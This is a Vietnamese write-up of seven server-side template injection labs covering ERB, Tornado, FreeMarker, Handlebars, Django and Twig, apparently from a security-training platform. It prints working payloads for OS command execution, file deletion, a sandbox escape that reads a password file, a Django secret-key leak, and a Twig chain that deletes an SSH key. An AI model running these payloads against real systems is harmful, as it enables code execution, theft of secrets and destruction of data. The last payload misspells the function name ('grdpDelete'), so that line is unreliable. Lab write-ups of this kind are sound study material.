---
title: Server-side Template Injection

---

# Server-side Template Injection

## Lab 1: Basic server-side template injection
Bài lab sử dụng template của ERB.

Khi mình ấn view detail của product đầu tiên thì nó sẽ hiện `Unfortunately this product is out of stock` và ở trong request mình có thể kiểm soát được param này. Đây là injection point mà mình cần tìm.
![image](https://hackmd.io/_uploads/r1ydI09AC.png)

Payload cơ bản của ERB để detect lỗ hổng này `<%= 7 * 7 %>`
Số 49 đã hiện lại
![image](https://hackmd.io/_uploads/H1aWwAcAR.png)

Payload `<%= system("ls -la"); %>`
![image](https://hackmd.io/_uploads/Sy_cv0q0A.png)

<%= system("rm morale.txt"); %>
![image](https://hackmd.io/_uploads/B18pD0c00.png)

## Lab 2: Basic server-side template injection (code context)
Bài lab sử dụng Tornado template. 

Ở đây mình thấy có 1 hàm thú vị đó chính là `prefered name`. Nó có thể là username, first_name, nickname, và tên đó sẽ hiện lên trên các blog post khi mình comment
![image](https://hackmd.io/_uploads/SkI5KC9CA.png)
![image](https://hackmd.io/_uploads/Sk33K0qA0.png)

Nếu mình thay đổi thành user.abcd thì sao. Lỗi tùm lum
![image](https://hackmd.io/_uploads/BJNJ5RqC0.png)
Mình nghĩ context ở đây sẽ là `user.username` sẽ được đưa vào trong dấu `{{}}` - nơi xác nhận có 1 template và được thực thi. Vậy mình sẽ thử escape nó ra và inject vào 1 payload mới.
![image](https://hackmd.io/_uploads/SJyjcC50A.png)

Số 49 đã xuất hiện, mình không đóng dấu `}}` này lại vì có thể sẽ gây ra lỗi syntax, nhưng mà nó cũng không bị lỗi gì cả khi thêm vào. Và giờ thực thi OS command để solve bài lab thôi. 
![image](https://hackmd.io/_uploads/HkR7iA90A.png)

Payload: `user.first_name}}{% import os %}{{ os.popen("rm morale.txt").read()`

## Lab 3: Server-side template injection using documentation
Đăng nhập bài lab với tư cách là 1 content-manager mình có thể chỉnh sửa template của từng bài post. Nghịch ngợm 1 chút thì cuối cùng nó cũng hiện ra lỗi. Template này là freemarker
![image](https://hackmd.io/_uploads/r1kCMkj0A.png)

Mình tìm payload trên HackTrick thì hình như nó ra luôn cả payload cho bài lab này :v 
![image](https://hackmd.io/_uploads/SJ0Im1jCC.png)

Payload dùng cái nào cũng được

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

Final payload: `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}`

# Lab 4: Server-side template injection in an unknown language with a documented exploit
Nhập bừa payload để xem nó hiện lỗi gì
![image](https://hackmd.io/_uploads/HJl64yj0A.png)

Nó sử dụng HandleBars template. Mình copy y nguyên payload trên PayloadAllTheThing và urlencode nó nhưng mà lại bị lỗi. Xem ra thấy web này mình cần phải gửi payload đã hex hết tất cả các kí tự
![image](https://hackmd.io/_uploads/H1VpUJj0A.png)

![image](https://hackmd.io/_uploads/S15yvJiR0.png)

# Lab 5: Server-side template injection with information disclosure via user-supplied objects
Trở lại với tư cách là content-manager, mình đi test template ở 1 bài post và hiện lỗi này
![image](https://hackmd.io/_uploads/BJaoD1oRR.png)

Template này của django và bài lab chỉ yêu cầu mình steal framework's secret key. 

Vì bài lab yêu cầu lấy secret key cho và mình thấy payload này sẽ trả về chúng ta nhiều thông tin thú vị.
![image](https://hackmd.io/_uploads/SyCQ6lsAR.png)

Nó có 2 key là products và settings và chúng ta cần tập chung vào key này. Mình ctrl+F thử tìm key hay secret key mà chỉ có
![image](https://hackmd.io/_uploads/Hke9axiCC.png)

Thử để payload là `{{ settings }}`
![image](https://hackmd.io/_uploads/ryJCagiR0.png)

Nó là 1 object cho nên chỉ hiển thị lại UserSettingHolder. Đọc docs liên quan đến nó thì mình có thể truy cập đến SECRET_KEY
![image](https://hackmd.io/_uploads/ryIL0xj0R.png)

`{{ settings.SECRET_KEY }}`
![image](https://hackmd.io/_uploads/BJsYRxsC0.png)

Đây chính là đoạn key mà ta cần tìm. Submit solution thôi.

# Lab 6: Server-side template injection in a sandboxed environment
Bài lab sử dụng Freemarker template engine. Mình cần phải break out sandbox này để đọc file `my_password.txt`.

Mình thử payload đã sử dụng với bài lab nào đó bên trên thì lỗi
![image](https://hackmd.io/_uploads/Bk4PyZjRC.png)
Hàm Execute bị chặn vì lí do bảo mật. 

Như mình đã từng nói bên trên thì HackTrick có payload của bài này nên mình sử dụng luôn
`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
![image](https://hackmd.io/_uploads/Bk7akWoRC.png)

Nó trả về 1 chuỗi ASCII, dùng tool để dịch
![image](https://hackmd.io/_uploads/rygZgZj0C.png)

SSTI kiểu dạng này phải nghiên cứu khá là nhiều vì từ 1 biến mà có thể truy cập ra các hàm toàn cục ... rồi truy cập vào các hàm đọc file hoặc kiểu dạng vậy thì chúng ta có thể phá được cái sandbox mà bài lab đã dựng. 

# Lab 7: Server-side template injection with a custom exploit
Bài lab này muốn mình tạo 1 payload để xóa 1 file `/.ssh/id_rsa` từ carlos home directory.

Bài lab này cũng dùng chức năng là preferedname giống bài lab nào đó bên trên và thêm 1 chức năng upload avatar.

Mình vẫn có thể tạo lại số 49 với payload trong ảnh
![image](https://hackmd.io/_uploads/HJYOZ-jC0.png)

Nhưng bài lab này lại sử dụng 1 template engine khác là Twig là template engine của PHP.

Sau khi thử hết các public payload có trên HackTrick và PayloadAllTheThing thì mình cảm thấy không khả thi vì hàm nào cũng bị chặn hết rồi. 

Mình quay lại với tính năng upload avatar. Khi upload 1 file png bình thường thì không có thông tin gì, nhưng khi mình upload 1 file không hợp lệ thì thấy lỗi sau
![image](https://hackmd.io/_uploads/Bk6r8boAA.png)

Mình thấy có 1 phương thức của user là setAvatar nhận vào đường dẫn 1 file để setAvatar. Nó nhận vào 2 param. Có vẻ như cái đầu tiên là nó di chuyển file của mình đến `/tmp`, param thứ 2 là 
content-type của file đó. 

Giờ mình thử truy cập từ preferedname và xem kết quả ở blog post
![image](https://hackmd.io/_uploads/S1cqwZsCR.png)
Mình đọc lại lỗi khi upload thiếu param thì thấy nó có sử dụng hàm eval trong hàm setAvatar này. 

Mình có thể đọc 1 file bất kì rồi, có lẽ mình sẽ thử đọc file này để xem hàm eval được sử dụng như thế nào.

Các bước để mình đọc file đó chính là
1. set payload `blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpg')&csrf=token`
2. Vào 1 blog post nào đó để payload của mình được load và avatar được cập nhật
3. Tải file avatar về

Dưới đây là mã nguồn của file xử lý upload avatar
```php=
<?php

require_once("./User.php");

if ($_FILES['avatar']['error'] !== 0) {
    throw new Exception("Error in file upload: " . $_FILES['avatar']['error']);
}

if (strpos($_FILES['avatar']['name'], "/") !== false || strpos($_FILES['avatar']['name'], ".") === false) {
    throw new Exception("Uploaded file name is invalid: " . $_FILES['avatar']['name']);
}

$file = "/tmp/" . $_FILES['avatar']['name'];
if (!move_uploaded_file($_FILES['avatar']['tmp_name'], $file)) {
    throw new Exception("Could not move uploaded file '" . $_FILES['avatar']['tmp_name'] . "' to '" . $file . "'");
}

$user = new User($_POST['user'], null, null, null);
$user->setAvatar($file, $_FILES['avatar']['type']);
header('Location: ./');

?>
```

Và file `User.php`
```php=
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Sau khi đọc file User.php thì mình thấy có hàm `gdrpDelete` sử dụng hàm rm để xóa file. 
Hàm tên delete chỉ là làm rỗng cái file đó đi chứ không phải xóa file. Và mục tiêu của chúng ta cần là xóa file `.ssh/id_rsa` của carlos.
Do hàm `rm` là private function cho nên chúng ta không thể truy cập trực tiếp đến nó, nếu thế thì dễ quá :v 

Đầu tiên chúng ta cần tạo 1 symlink với hàm setAvatar (`if (!symlink($filename, $this->avatarLink))`), nếu có link thì nó đã xóa và remove luôn, thế là xong bài lab, nhưng mình cần 1 bước nữa là gọi hàm gdprDelete() để xóa symlink với this->avatarLink đó. Vì hàm avatar mình gọi trước đó set cho User->avatarLink là file mình cần xóa, cho nên khi gọi hàm này chúng ta sẽ xóa được file với hàm private `rm` và xong bài lab.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')&csrf=r7waHyzWe8xAUgubGOpK5fpPQPyTGEuz`

`blog-post-author-display=user.grdpDelete()&csrf=r7waHyzWe8xAUgubGOpK5fpPQPyTGEuz`

![image](https://hackmd.io/_uploads/HyKvhbi0C.png)
